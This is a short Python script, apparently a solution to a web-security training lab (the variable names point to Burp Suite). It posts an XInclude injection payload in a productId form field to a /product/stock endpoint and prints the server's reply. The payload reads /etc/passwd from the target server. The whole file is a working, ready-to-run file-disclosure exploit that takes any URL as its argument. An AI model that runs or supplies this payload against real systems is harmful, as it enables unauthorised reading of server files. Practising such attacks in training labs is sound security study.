import requests
import sys

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]+'/product/stock'

burp_headers = {"Content-Type": "application/x-www-form-urlencoded"}
burp_data = {"productId": "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/passwd\"/></foo>\r\n", "storeId": "1"}
r = requests.post(burp_url, headers=burp_headers, data=burp_data)
print(r.text)
